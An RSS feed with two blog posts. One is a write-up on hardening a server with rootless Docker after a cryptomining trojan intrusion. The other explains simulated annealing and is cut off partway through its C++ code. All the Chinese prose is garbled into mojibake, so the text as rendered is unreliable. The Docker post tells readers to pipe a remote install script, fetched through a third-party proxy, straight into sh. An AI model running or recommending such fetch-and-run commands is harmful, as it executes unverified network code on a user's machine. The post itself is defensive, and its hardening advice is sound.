<?xml version="1.0" encoding="UTF-8" ?>
    <rss version="2.0">
    <channel>
        <title><![CDATA[ ä¸»é¡µ - åå®¢å­ ]]></title>
        <link><![CDATA[ https://www.cnblogs.com/ ]]></link>
        <lastBuildDate>2026-02-20T13:15:28.895Z</lastBuildDate>
        <description><![CDATA[
        ä¸»é¡µ - åå®¢å­ RSS
    ]]></description>
        <language>zh-cn</language>
        <item>
    <title><![CDATA[ ä»æç¿æ¨é©¬å¥ä¾µå° Docker Rootless å åºï¼æçæå¡å¨å®å¨å¤ç ]]></title>
    <link>https://www.cnblogs.com/deali/p/19626849</link>
    <guid>bad83b26ce1d20632b52ac7719ac2f40</guid>
    <description>
    <![CDATA[ 
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/deali/p/19626849" title="åå¸äº 2026-02-20 20:45">
    <span role="heading" aria-level="2">ä»æç¿æ¨é©¬å¥ä¾µå° Docker Rootless å åºï¼æçæå¡å¨å®å¨å¤ç</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                <div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<h2 id="åè¨">åè¨</h2>
<p>æè¿æè¿ç»­å å°æå¡å¨è¢«æäºæç¿æ¨é©¬ï¼CPUãå¸¦å®½ãç£ç IO è¢«ææ»¡ï¼æå¡å¨ç´æ¥å¡æ­»æ æ³è¿æ¥ã</p>
<p>ææ¥ååç°ï¼æ ¸å¿è¯±å æ¯ Docker æéè¿é« + æå¡æ¼æ´æ´é²ï¼å¯¼è´æ»å»èéè¿å®¹å¨çªç ´æéæ§å¶ã</p>
<p><img src="https://blog.deali.cn/media/blog/cec878553480eb4f/1097027d157aa49e.jpg" alt="" loading="lazy"></p>
<blockquote>
<p>PSï¼æ¬æ¥æ³åä¸ç¯æç« ä»ç»ææ¥è¿ç¨çï¼ä¸è¿è¿æ¯å«éº»ç¦æ²¡åï¼æ¾å¨æ¬æä¸èµ·è®²å§~</p>
</blockquote>
<p>éè£ç³»ç»åï¼æå¨é¨ç½² Docker æ¶æ³¨æå°å®æ¹æç¤ºç Rootlessï¼æ æ ¹ï¼æ¨¡å¼ ââ è¿ä¸æ¨¡å¼è½ä»æ ¹æ¬ä¸éä½å®¹å¨éé¸é£é©ï¼éæ·±å¥ç ç©¶å¹¶è½å°éç½®ï¼ç°å°å®æ´è¿ç¨æ´çåäº«ï¼å¸æè½å¸®å°åæ ·å³æ³¨ Docker å®å¨çå¼åèã</p>
<h2 id="rootless-æ¨¡å¼æ¯ä»ä¹">Rootless æ¨¡å¼æ¯ä»ä¹</h2>
<p>æ®éæåµä¸ï¼Docker å®æ¤è¿ç¨ï¼dockerdï¼æ¯ç¨ <code>root</code> æéè¿è¡çï¼åªæä½ ç¨æ®éç¨æ·æ§è¡ <code>docker run</code>ï¼åºå±è¿æ¯ root æéï¼è¿æå®å¨é£é©ï¼æ¯å¦å®¹å¨éé¸å¯è½æ¿å°ä¸»æº rootï¼ã</p>
<p>Rootless æ¨¡å¼è®© Docker å®æ¤è¿ç¨ä»¥<strong>æ®éç¨æ·æé</strong>è¿è¡ï¼åªæå®¹å¨åºé®é¢ï¼ä¹æ æ³è·åä¸»æºç root æéï¼å®å¨æ§å¤§å¹æåã</p>
<p>æå¥½å¤èªç¶æä»£ä»·ï¼rootless çä»£ä»·æ¯éç½®å¤æï¼ä¸é¨ååè½åéï¼æ¯å¦æ æ³ç«¯å£æ å° &lt; 1024ï¼ã</p>
<p>ä¸è¿æ²¡å³ç³»ï¼è¿äºä¹å¯ä»¥éè¿éç½®è§£å³ãåä»å®è£å¼å§å§ã</p>
<h2 id="å®è£docker">å®è£docker</h2>
<p>æ¬æ¥å®è£æ¯å¾ç®åçï¼ä¸è¿å ä¸ªå®è¯­ï¼å¨å½åç½ç»ç¯å¢ï¼é£å°±éå¸¸å¤æäºã</p>
<p>æ¬æä»ç»æç®åçå®è£æ¹å¼ï¼ä½¿ç¨dockerå®æ¹èæ¬+æ¸åéåã</p>
<pre><code class="language-bash">export DOWNLOAD_URL="https://mirrors.tuna.tsinghua.edu.cn/docker-ce"
# å¦æ¨ä½¿ç¨ curl
curl -fsSL https://ghfast.top/https://raw.githubusercontent.com/docker/docker-install/master/install.sh | sh
# å¦æ¨ä½¿ç¨ wget
wget -O- https://ghfast.top/https://raw.githubusercontent.com/docker/docker-install/master/install.sh | sh
</code></pre>
<p>æ³¨æ <code>raw.githubusercontent.com</code> è¿ä¸ªååä¹æ¯æ æ³è®¿é®çï¼å¯ä»¥ä½¿ç¨ ghproxy æ¥å éã</p>
<h2 id="å®è£å®ææç¤º">å®è£å®ææç¤º</h2>
<p>å®è£å®æä¼æä¸ä¸ªæç¤ºï¼è¿ä¹æ¯å¼å¯ Rootless æ¨¡å¼çå³é®å¥å£ï¼</p>
<pre><code class="language-bash">================================================================================

To run Docker as a non-privileged user, consider setting up the
Docker daemon in rootless mode for your user:

    dockerd-rootless-setuptool.sh install

Visit https://docs.docker.com/go/rootless/ to learn about rootless mode.


To run the Docker daemon as a fully privileged service, but granting non-root
users access, refer to https://docs.docker.com/go/daemon-access/

WARNING: Access to the remote API on a privileged Docker daemon is equivalent
         to root access on the host. Refer to the 'Docker daemon attack surface'
         documentation for details: https://docs.docker.com/go/attack-surface/

================================================================================
</code></pre>
<p>æå°±æ¯å¨è¿éå¼å§ä½¿ç¨ rootless æ¨¡å¼çã</p>
<p>æç¤ºæ ¸å¿è§£è¯»ï¼</p>
<ol>
<li>æ¨èéè¿<code>dockerd-rootless-setuptool.sh install</code>å¼å¯ Rootless æ¨¡å¼ï¼è®©æ®éç¨æ·æ  root æéè¿è¡ Dockerï¼</li>
<li>è¥åæ root æéè¿è¡ Dockerï¼å¯åèææ¡£ç»æ®éç¨æ·ææï¼å¦å å¥ docker ç»ï¼ï¼ä½é£é©æ´é«ï¼</li>
<li>éç¹è­¦åï¼æ´é² Docker è¿ç¨ APIï¼å¦ 2375 ç«¯å£ï¼= ç´æ¥å¼æ¾ä¸»æº root æéï¼è¿æ¯æå¡å¨è¢«å¥ä¾µçé«é¢è¯±å ï¼</li>
</ol>
<h2 id="å®è£å¿è¦ä¾èµ">å®è£å¿è¦ä¾èµ</h2>
<p>æç´æ¥è¿è¡ <code>dockerd-rootless-setuptool.sh install</code> çæ¶åï¼æç¤ºè¦ç¼ºä¹ä¾èµ</p>
<pre><code class="language-bash">$ dockerd-rootless-setuptool.sh install
[ERROR] Missing system requirements. Run the following commands to
[ERROR] install the requirements and run this tool again.

########## BEGIN ##########
sudo sh -eux &lt;&lt;EOF
# Install newuidmap &amp; newgidmap binaries
apt-get install -y uidmap
EOF
########## END ##########
</code></pre>
<p>è¾å¥æç¤ºçè¿è¡å½ä»¤ï¼</p>
<pre><code class="language-bash">sudo sh -eux &lt;&lt;EOF
# Install newuidmap &amp; newgidmap binaries
apt-get install -y uidmap
EOF
</code></pre>
<p>å®è£å®æåï¼åæ¬¡æ§è¡ <code>dockerd-rootless-setuptool.sh install</code></p>
<p>ä»¥åæä½ docker æå¡ï¼è¦å ä¸ <code>--user</code></p>
<pre><code class="language-bash">systemctl --user start docker.service
</code></pre>
<h2 id="éç½®">éç½®</h2>
<p>rootless æ¨¡å¼ä¸ï¼</p>
<ul>
<li>ææ Docker å½ä»¤é½è¦å¨<strong>å®è£ Rootless çæ®éç¨æ·</strong>ä¸æ§è¡ï¼ä¸è¦ç¨ rootï¼ï¼</li>
<li>å¦æéå¯æå¡å¨å Docker æ²¡èªå¨å¯å¨ï¼æ§è¡ï¼<code>systemctl --user enable --now docker</code>ï¼</li>
<li>æ°æ®å¤ä»½è¦æ¾ <code>~/.local/share/docker</code> ç®å½ï¼èé <code>/var/lib/docker</code>ï¼ã</li>
</ul>
<h3 id="éåå éå¨">éåå éå¨</h3>
<p>é»è®¤æåµä¸ï¼Rootless Docker çéç½®æä»¶å­æ¾å¨å½åç¨æ·ç <strong>XDG éç½®ç®å½</strong> ä¸ï¼è·¯å¾æ¯ï¼<code>~/.config/docker/daemon.json</code></p>
<pre><code class="language-bash"># ååå»ºç®å½ï¼å¦æä¸å­å¨ï¼
mkdir -p ~/.config/docker

# ç¼è¾éç½®æä»¶ï¼ç¨ nano æ vim é½å¯ä»¥ï¼
nano ~/.config/docker/daemon.json
</code></pre>
<p>éç½®å éå¨</p>
<pre><code class="language-json">{
  "registry-mirrors": ["https://ä½ çé¿éäºéåå éå°å.mirror.aliyuncs.com"],
  "log-driver": "json-file",
  "log-opts": {
    "max-size": "100m",
    "max-file": "3"
  }
}
</code></pre>
<p>æ³¨æï¼ä¹åå¤§é¨åç¨³å®å¥½ç¨çå éå¨é½åæ­¢æå¡äºï¼ç°å¨å°±æ²¡æ³æ¨èå¥ï¼å¤§å®¶åå­æ¬äºå§ã</p>
<h3 id="è§£å³-æ æ³ç»å®-1-1023-ç«¯å£-çé®é¢">è§£å³ âæ æ³ç»å® 1-1023 ç«¯å£â çé®é¢</h3>
<p>éè¦ç»å½åç¨æ· âç»å®ä½ç«¯å£â çæéï¼</p>
<pre><code class="language-bash"># ç»å½åç¨æ·ææç»å® 1-1023 ç«¯å£ï¼ä»å¯¹å½åä¼è¯çæï¼
sudo sysctl net.ipv4.ip_unprivileged_port_start=0

# æ°¸ä¹çæï¼éå¯åä¹ææï¼
echo "net.ipv4.ip_unprivileged_port_start=0" | sudo tee -a /etc/sysctl.conf
sudo sysctl -p  # ç«å³çæ
</code></pre>
<p>æ§è¡åï¼ä½ å°±è½æ­£å¸¸æ å° 80ã443 ç­ç«¯å£äºã</p>
<h3 id="éå¯çæ">éå¯çæ</h3>
<p>Rootless æ¨¡å¼ç Docker éå¯å½ä»¤åç³»ç»çº§ä¸åï¼æ§è¡ï¼</p>
<pre><code class="language-bash"># éå¯å½åç¨æ·ç Docker æå¡
systemctl --user restart docker

# éªè¯éç½®æ¯å¦çæ
docker info
# è½å¨ "Registry Mirrors" é¨åçå°ä½ éç½®çéåå éå°åå°±æ¯æåç
</code></pre>
<p>æ­£å¸¸è¾åºç¤ºä¾ï¼</p>
<pre><code class="language-plaintext">Rootless: true
Registry Mirrors:
 https://ä½ çé¿éäºéåå éå°å.mirror.aliyuncs.com/
</code></pre>
<h3 id="rootless-æ¨¡å¼ä¸æ¯æçéç½®é¡¹">Rootless æ¨¡å¼ä¸æ¯æçéç½®é¡¹</h3>
<p>é¨åç³»ç»çº§éç½®å¨ Rootless ä¸æ æï¼å ä¸ºæ²¡æ root æéï¼ï¼æ¯å¦ï¼</p>
<ul>
<li><code>iptables: false</code>ï¼ç½ç»è§åç± slirp4netns ç®¡çï¼èé iptablesï¼ï¼</li>
<li><code>storage-driver: overlay2</code>ï¼é»è®¤å·²å¯ç¨ï¼æ éæå¨éç½®ï¼ï¼</li>
<li>è¿ç¨ API ç¸å³éç½®ï¼å¦ <code>hosts: ["tcp://0.0.0.0:2375"]</code>ï¼Rootless ä¸ä¸å»ºè®®å¼å¯ï¼ã</li>
<li>ä»»ä½æ¶åç³»ç»çº§ç®å½ï¼å¦<code>/var/run/docker.sock</code>ï¼çéç½®ã</li>
</ul>
<h2 id="volumeé®é¢">volumeé®é¢</h2>
<p>åæ¢å° rootless ä¹åï¼æè¿åç°äº swag ç config æ æ³è¯»åäºã</p>
<p>swag ç compose.yaml éç½®æ¯è¿æ ·ï¼</p>
<pre><code class="language-yaml">services:
  swag:
    image: linuxserver/swag
    container_name: swag
    cap_add:
      - NET_ADMIN
    environment:
      - PUID=1000
      - PGID=1000
    volumes:
      - ./config:/config
</code></pre>
<p><strong>rootless Docker éï¼å®¹å¨åç UID=1000 â  å®¿ä¸»æºç UID=1000</strong></p>
<p>æä»¥ <strong>SWAG å¨å®¹å¨é chown äº <code>/config</code>ï¼å®¿ä¸»æºçå°çæ¯ä¸ä¸ªâæ å°åçéç UIDï¼100999ï¼â</strong></p>
<h3 id="è§£å³æ¹æ³">è§£å³æ¹æ³</h3>
<p>rootless å®æ¹æ¨èä½¿ç¨å½åå·ï¼ä½æè¦ç»å¸¸ä¿®æ¹ config éçæä»¶ï¼è¿ä¸ªè¯å®ä¸ç°å®ã</p>
<p>é£ä¹è¿æä¸ä¸ªæ¹æ³ï¼ä½¿ç¨ ACL æ¾è¡ã</p>
<p>åå®è£ç¸å³å·¥å·ï¼</p>
<pre><code class="language-bash">sudo apt update
sudo apt install -y acl
</code></pre>
<p>å¨ swag ç®å½ä¸æ§è¡</p>
<pre><code class="language-bash">setfacl -m u:ecs-user:rwx config
setfacl -R -m u:ecs-user:rwx config
setfacl -d -m u:ecs-user:rwx config
</code></pre>
<p>éªè¯ï¼</p>
<pre><code class="language-bash">getfacl config | sed -n '1,20p'
</code></pre>
<p>çå°ç±»ä¼¼ï¼</p>
<pre><code>user::rwx
user:ecs-user:rwx
group::r-x
mask::rwx
other::r-x
</code></pre>
<h2 id="å°ç»">å°ç»</h2>
<p>Rootless æ¨¡å¼è½æ¯æ®é Docker éç½®ç¨ç¹çï¼ä½è½ä»æ ¹æ¬ä¸éä½å®¹å¨éé¸é£é©ï¼å°¤å¶éåå¯¹å¤æä¾æå¡ççäº§æå¡å¨ãæ ¸å¿æ»ç»ï¼</p>
<ol>
<li>å®è£ï¼ç»åæ¸åéåæºè§£å³å½åä¸è½½é®é¢ï¼ä¼åç¨æ®éç¨æ·å®è£ Rootless æ¨¡å¼ï¼</li>
<li>æéï¼ç¦æ­¢æ´é² Docker è¿ç¨ APIï¼ç»æ®éç¨æ·ææä½ç«¯å£ç»å®æéå³å¯æ»¡è¶³æ¥å¸¸ä½¿ç¨ï¼</li>
<li>éç½®ï¼ç¢è®° Rootless æ¨¡å¼çéç½®æä»¶ãæ°æ®ç®å½åå¨ç¨æ·ç®å½ä¸ï¼ä¸ç³»ç»çº§ Docker åºåå¼ï¼</li>
<li>å®å¨ï¼å³ä¾¿å¼å¯ Rootlessï¼è¿è¡å®¹å¨æ¶ä»éæ³¨ææå¡å®å¨ï¼å¦ Redis å å¯ç ãå®å¨ç»éå¶ç«¯å£è®¿é®ï¼ã</li>
</ol>
<p>æ­¤æ¬¡è¸©åè®©ææ·±å»æè¯å°ï¼æå¡å¨å®å¨æ å°äºï¼åªææ¯ Docker è¿æ ·çåºç¡å·¥å·ï¼ä¹éä»æéå±é¢åå¥½æå°åç®¡æ§ï¼æè½é¿åè¢«æç¿æ¨é©¬ç­æ¶æç¨åºè¶èèå¥ã</p>


</div>
<div id="MySignature" role="contentinfo">
    å¾®ä¿¡å¬ä¼å·ï¼ãç¨åºè®¾è®¡å®éªå®¤ã
ä¸æ³¨äºäºèç½ç­é¨æ°ææ¯æ¢ç´¢ä¸å¢éææ·å¼åå®è·µï¼åæ¬æ¶æè®¾è®¡ãæºå¨å­¦ä¹ ä¸æ°æ®åæç®æ³ãç§»å¨ç«¯å¼åãLinuxãWebååç«¯å¼åç­ï¼æ¬¢è¿ä¸èµ·æ¢è®¨ææ¯ï¼åäº«å­¦ä¹ å®è·µç»éªã
</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0" data-date-updated="2026-02-20 20:46">2026-02-20 20:45</span>&nbsp;
<a href="https://www.cnblogs.com/deali">ç¨åºè®¾è®¡å®éªå®¤</a>&nbsp;
éè¯»(<span id="post_view_count">0</span>)&nbsp;
è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(19626849);return false;">æ¶è</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19626849', targetLink: 'https://www.cnblogs.com/deali/p/19626849', title: 'ä»æç¿æ¨é©¬å¥ä¾µå° Docker Rootless å åºï¼æçæå¡å¨å®å¨å¤ç' })">ä¸¾æ¥</a>
</div>
         ]]>
    </description>
    </item>
<item>
    <title><![CDATA[ æ¨¡æéç«ç®æ³ ]]></title>
    <link>https://www.cnblogs.com/PaperPlaneFly/p/19626799</link>
    <guid>044d6b7c4716bcb5b1b33ef6890a5c68</guid>
    <description>
    <![CDATA[ 
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/PaperPlaneFly/p/19626799" title="åå¸äº 2026-02-20 20:14">
    <span role="heading" aria-level="2">æ¨¡æéç«ç®æ³</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                    <div id="cnblogs_post_description" style="display: none">
        <img src="https://img2024.cnblogs.com/blog/3540252/202602/3540252-20260220201320618-591678279.png" alt="æ¨¡æéç«ç®æ³" class="desc_img">
        æ¨¡æéç«ç®æ³ææ©çææ³ç±**Metropolis **ç­ï¼** **1953** **ï¼æåºï¼** **1983** **å¹´** **Kirkpatrick** **ç­å°å¶åºç¨äºç»åä¼åã
    </div>
<div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<h1 id="æ¨¡æéç«ç®æ³">æ¨¡æéç«ç®æ³</h1>
<p>â    <strong>æ¨¡æéç«ç®æ³ææ©çææ³ç±</strong>Metropolis <strong>ç­ï¼</strong> <strong>1953</strong> <strong>ï¼æåºï¼</strong> <strong>1983</strong> <strong>å¹´</strong> <strong>Kirkpatrick</strong> <strong>ç­å°å¶åºç¨äºç»åä¼åã</strong></p>
<p><strong>ç®æ³çç®ç</strong>ï¼</p>
<p><strong>åæä¼åè¿ç¨é·å¥å±é¨æå°ï¼</strong></p>
<p><strong>åæåå¼ä¾èµæ§ã</strong></p>
<h2 id="ç©çéç«è¿ç¨">ç©çéç«è¿ç¨</h2>
<p>å¨ç©çå­¦ä¸­ï¼<strong>éç«</strong>æ¯å°éå±å ç­å°æé«æ¸©åº¦ï¼ç¶åè®©å¶<strong>æå¶ç¼æ¢</strong>å°å·å´çè¿ç¨ã</p>
<ul>
<li><strong>é«æ¸©ç¶æ</strong>ï¼åå­è¿å¨å§çï¼å¤äºæ åºç¶æï¼é«è½éï¼ã</li>
<li><strong>ç­æ¸©è¿ç¨</strong>  <strong>å¯¹äºä¸ç¯å¢æ¢ç­èæ¸©åº¦ä¸åçå°é­ç³»ç»ï¼ç³»ç»ç¶æçèªåååæ»æ¯æèªç±è½åå°çæ¹åè¿è¡ï¼å½èªç±è½è¾¾å°æå°æ¶ï¼ç³»ç»è¾¾å°å¹³è¡¡æï¼</strong></li>
<li><strong>ç¼æ¢å·å´</strong>ï¼åå­éæ¸æ¾å°æç¨³å®çä½ç½®ï¼å½¢ææ´é½çæ¶ä½ç»æã</li>
<li><strong>æç»ç¶æ</strong>ï¼ç³»ç»ç<strong>åè½æä½</strong>ï¼å¨å±æä¼ï¼ã</li>
</ul>
<p>å¦æå·å´å¾å¤ªå¿«ï¼<strong>æ·¬ç«</strong>ï¼Quenchingï¼ï¼åå­æ¥ä¸åè°æ´ä½ç½®å°±è¢«âå»ç»âå¨æä¹±çç¶æï¼ç³»ç»å¤äºäºç¨³æï¼å±é¨æä¼ï¼åè½è¾é«ï¼ææèï¼ã</p>
<p>æ¸©åº¦è¶ä½ï¼ç©ä½çè½éç¶æè¶ä½ï¼å°è¾¾è¶³å¤çä½ç¹æ¶ï¼æ¶²ä½å¼å§å·åä¸ç»æ¶ï¼å¨ç»æ¶ç¶ææ¶ï¼ç³»ç»çè½éç¶ææä½ãç¼æ¢éæ¸©ï¼éç«æ¶ï¼å¯è¾¾å°æä½è½éç¶æï¼ä½å¦æå¿«ééæ¸©ï¼æ·¬ç«ï¼ä¼å¯¼è´ä¸æ¯æä½è½æçéæ¶å½¢ã</p>
<h2 id="boltzmannæ¦çåå¸"><strong>Boltzmann</strong>æ¦çåå¸</h2>
<p>å¨æ¸©åº¦Tï¼åå­åçå¨ç¶æræ»¡è¶³Boltzmannæ¦çåå¸</p>
<p><img src="https://img2024.cnblogs.com/blog/3540252/202602/3540252-20260220200000416-839968077.png" alt="image" loading="lazy"></p>
<p><img src="https://ts3.tc.mm.bing.net/th/id/OIP-C.F28T_kCjs5-MqGcOpdgA9wHaE1?rs=1&amp;pid=ImgDetMain&amp;o=7&amp;rm=3" alt="ç§å­¦ç½âç§å­¦å²-ç©çå­¦ç¼å¹´å²-80ç»å°å¹æ¼åå¸å¾ - å¼ å»¶å¹´çåæ" loading="lazy"></p>
<p>å¨åä¸ä¸ªæ¸©åº¦Tï¼éå®ä¸¤ä¸ªè½éE1&lt;E2ï¼æ</p>
<p><img src="https://img2024.cnblogs.com/blog/3540252/202602/3540252-20260220200026317-2005365913.png" alt="image" loading="lazy"></p>
<p><strong>ï¼</strong>1<strong>ï¼å¨åä¸ä¸ªæ¸©åº¦ï¼åå­åçå¨è½éå°ç¶æçæ¦çå¤§äºåçå¨è½éå¤§ç¶æçæ¦ç</strong></p>
<p><strong>ï¼</strong>2<strong>ï¼æ¸©åº¦è¶é«ï¼ä¸åè½éç¶æå¯¹åºçæ¦çç¸å·®è¶å°ï¼æ¸©åº¦è¶³å¤é«æ¶ï¼åç¶æå¯¹åºæ¦çåºæ¬ç¸åã</strong></p>
<p><strong>ï¼</strong>3<strong>ï¼éçæ¸©åº¦çä¸éï¼è½éæä½ç¶æå¯¹åºæ¦çè¶æ¥è¶å¤§ï¼æ¸©åº¦è¶äº</strong>0<strong>æ¶ï¼å¶ç¶æè¶äº</strong>1</p>
<h2 id="metropolisåå"><strong>Metropolis</strong>åå</h2>
<p><strong>ä»¥æ¦çæ¥åæ°ç¶æ</strong></p>
<p>åè®¾å½åç¶æä¸º xï¼è½éä¸º E(x)ã</p>
<p>æä»¬éæºçæäºä¸ä¸ªé»åæ°è§£ x'ï¼è½éä¸º E(x')ã</p>
<p>å®ä¹è½éå·®ä¸ºï¼</p>
<p><img src="https://img2024.cnblogs.com/blog/3540252/202602/3540252-20260220200221455-1081080706.png" alt="image" loading="lazy"></p>
<p>ç®åæ¥è¯´ï¼å®çæ ¸å¿æ°å­¦ææ³æ¯ï¼<strong>ä»¥ä¸å®çæ¦çæ¥åä¸ä¸ªâæ´å·®âçè§£ï¼ä»èè·³åºå±é¨æä¼é·é±ï¼æç»è¶åå¨å±æä¼ã</strong></p>
<h4 id="æåµ-aæ°è§£æ´å¥½-Î´e0">æåµ Aï¼æ°è§£æ´å¥½ (Î<em>E</em>&lt;0)</h4>
<p>å¦ææ°è§£çè½éæ´ä½ï¼æ¯å¦å¨ä¸å±±ï¼ï¼æä»¬<strong>100% æ¥å</strong>è¿ä¸ªæ°è§£ã</p>
<p><em>P</em>(accept)=1</p>
<p>è¿å¯¹åºäºè´ªå¿ç®æ³ï¼Gradient Descentï¼çé¨åã</p>
<h4 id="æåµ-bæ°è§£æ´å·®-Î´e0">æåµ Bï¼æ°è§£æ´å·® (Î<em>E</em>&gt;0)</h4>
<p>å¦ææ°è§£çè½éæ´é«ï¼æ¯å¦è¦ç¬å¡ï¼åæ¹åï¼ï¼æä»¬<strong>ä¸æ¯ç´æ¥æç»</strong>ï¼èæ¯<strong>ä»¥ä¸å®çæ¦çæ¥åå®</strong>ãè¿ä¸ªæ¦ç <em>P</em> æä» <strong>ç»å°å¹æ¼åå¸ (Boltzmann Distribution)</strong>ï¼</p>
<p><img src="https://img2024.cnblogs.com/blog/3540252/202602/3540252-20260220200357347-1971444950.png" alt="image" loading="lazy"></p>
<ul>
<li>
<p>Î<em>E</em>ï¼è½éå·®ï¼è¯å®ä¸ºæ­£ï¼ã</p>
</li>
<li>
<p><em>T</em>ï¼å½åçæ¸©åº¦ã</p>
</li>
<li>
<p><em>k</em>ï¼ç©çä¸­çç»å°å¹æ¼å¸¸æ°ï¼å¨ç®æ³ä¸­éå¸¸è®¾ä¸º 1ï¼ã</p>
</li>
</ul>
<h4 id="1-æ¸©åº¦-t-æé«æ¶-æ¢ç´¢é¶æ®µ">(1) æ¸©åº¦ T æé«æ¶ (æ¢ç´¢é¶æ®µ)</h4>
<p><img src="https://img2024.cnblogs.com/blog/3540252/202602/3540252-20260220200411620-1794628474.png" alt="image" loading="lazy"></p>
<p>æ¥åæ¦çæ¥è¿ 100%ãåªææ°è§£æ¯æ§è§£å·®å¾å¤ï¼ç®æ³ä¹ä¼æ¥åã</p>
<p>ç®æ³å¨æç´¢ç©ºé´ä¸­<strong>éæºæ¸¸èµ° (Random Walk)</strong>ï¼åä¸ªéæ±ãè¿ä¿è¯äºå®è½ç¿»è¶æé«çå±±å³°ï¼ä»æ·±åéè·³åºæ¥ï¼éåæ´ä¸ªç©ºé´ã</p>
<h4 id="2-æ¸©åº¦-t-éä½æ¶-è¿æ¸¡é¶æ®µ">(2) æ¸©åº¦ T éä½æ¶ (è¿æ¸¡é¶æ®µ)</h4>
<p>éç T åå°ï¼åæ¯åå°ï¼ææ°é¨ååæè¾å¤§çè´æ°ã<br>
<img src="https://img2024.cnblogs.com/blog/3540252/202602/3540252-20260220200433875-1909155565.png" alt="image" loading="lazy"></p>
<p>å¦æDelta E å¾å¤§ï¼è§£åå·®å¾å¤ï¼ï¼æ¦ç P<span class="math inline">\(å°±ä¼å¾å°ï¼å¦æ \Delta E\)</span>å¾å°ï¼åªå·®ä¸ç¹ç¹ï¼ï¼æ¦ç P$è¿æ¯è¾å¤§ã</p>
<p>ç®æ³å¼å§åå¾æåãå®ä»ç¶åè®¸è·³åºæµåï¼å±é¨æä¼ï¼ï¼ä½ä¸åæ¥åé£äºå¤ªç¦»è°±çå·®è§£ã</p>
<h4 id="3-æ¸©åº¦-t-æä½æ¶-æ¶æé¶æ®µ">(3) æ¸©åº¦ T æä½æ¶ (æ¶æé¶æ®µ)</h4>
<p><img src="https://img2024.cnblogs.com/blog/3540252/202602/3540252-20260220200452308-1356373863.png" alt="image" loading="lazy"></p>
<p>æ¥åæ´å·®è§£çæ¦çå ä¹ä¸º 0ã</p>
<p>ç®æ³éåä¸º<strong>è´ªå¿ç®æ³ (Hill Climbing)</strong>ãå®åªæ¥åå¥½è§£ï¼ä¸åç¬å¡ãè¿æ¶åå®åºè¯¥å·²ç»è½å¥äºå¨å±æä¼</p>
<h2 id="éæ¸©ç³»æ°">éæ¸©ç³»æ°</h2>
<p>å¨æ¯ä¸ä¸ªåºå®çæ¸©åº¦ Tä¸ï¼ç®æ³è¿è¡å¤æ¬¡è¿­ä»£ãè¿å®éä¸æ¯å¨çæä¸ä¸ªé©¬å°å¯å¤«é¾ã å¦æè¿­ä»£æ¬¡æ°è¶³å¤å¤ï¼ç³»ç»ä¼è¾¾å°æä»ç»å°å¹æ¼åå¸<strong>ç­å¹³è¡¡åå¸ (Stationary Distribution)</strong>ã</p>
<p>å½ Tç¼æ¢ä¸éæ¶ï¼æ¦çåå¸å¾ä¼åå¾è¶æ¥è¶å°ï¼Peakedï¼ï¼å¤§é¨åæ¦çå¯åº¦ä¼éä¸­å¨å¨å±æå°å¼çéè¿ã</p>
<p>å¼å¥å·å´ç³»æ°ï¼</p>
<p><strong>æ°å­¦ä¸çæä¼éæ¸© (å¯¹æ°å·å´)</strong>ï¼ Geman å¨ 1984 å¹´è¯æï¼å¦æéæ¸©éåº¦è¶³å¤æ¢ï¼æ»¡è¶³ï¼<br>
<img src="https://img2024.cnblogs.com/blog/3540252/202602/3540252-20260220200507935-837856176.png" alt="image" loading="lazy"></p>
<p>é£ä¹æ¨¡æéç«ä»¥<strong>æ¦ç 1 æ¶æå°å¨å±æä¼è§£</strong>ã <em>ç¼ºç¹</em>ï¼è¿ä¸ªéåº¦å¤ªæ¢äºï¼æ¢å°å®éä¸æ æ³ä½¿ç¨ï¼å¯è½éè¦å ç¾å¹´ï¼ã</p>
<p><strong>å·¥ç¨ä¸çéæ¸© (ææ°å·å´)</strong>ï¼<br>
<img src="https://img2024.cnblogs.com/blog/3540252/202602/3540252-20260220200518474-1965198914.png" alt="image" loading="lazy"></p>
<p>è¿æ¯å¯¹æ¶æéåº¦åæ±è§£è´¨éçæè¡·ãè½ç¶çè®ºä¸ä¸ä¿è¯ 100% æ¾å°å¨å±æä¼ï¼ä½å¨æéæ¶é´åè½æ¾å°âè¶³å¤å¥½âçè§£ã</p>
<h2 id="rosenbrock-å½æ°éªè¯">Rosenbrock å½æ°éªè¯</h2>
<p>N ç»´ Rosenbrock å½æ°çéå¸¸å®ä¹å¦ä¸ï¼</p>
<p></p><div class="math display">\[f(\mathbf{x}) = \sum_{i=1}^{N-1} [100 (x_{i+1} - x_i^2)^2 + (1 - x_i)^2]
\]</div><p></p><p><img src="https://img2024.cnblogs.com/blog/3540252/202602/3540252-20260220200541507-1548156741.png" alt="image" loading="lazy"></p>
<p><img src="https://img2024.cnblogs.com/blog/3540252/202602/3540252-20260220200605031-939946155.png" alt="image" loading="lazy"></p>
<h2 id="cåºä»£ç å¦ä¸">c++åºä»£ç å¦ä¸</h2>
<p>sa.hpp</p>
<pre><code>#ifndef SA_SA_HPP
#define SA_SA_HPP


#include "params.hpp"
#include "policies.hpp"
#include "detail/solver.hpp"

namespace sa {


    /**
     * @brief æ¨¡æéç«éç¨æ±è§£å½æ°
     * * @tparam State ç¶æç±»å (èªå¨æ¨å¯¼)
     * @tparam EnergyFunc è½éå½æ°ç±»å (èªå¨æ¨å¯¼)
     * @tparam NeighborFunc é»åå½æ°ç±»å (å¯é)
     * @tparam CoolingPolicy éæ¸©ç­ç¥ (å¯é)
     * @tparam ConstraintPolicy çº¦æç­ç¥ (å¯é)
     * * @param initial_state åå§ç¶æå¼
     * @param energy_func è½éå½æ°å¥æ
     * @param params ç®æ³åæ°éç½®
     * @param neighbor é»åçæå¨å®ä¾
     * @param cooling éæ¸©å¨å®ä¾
     * @param constraint çº¦æå¨å®ä¾
     * @return std::pair&lt;State, double&gt; {æä¼ç¶æ, æä¼è½éå¼}
     */
    template&lt;
            typename State,
            typename EnergyFunc,
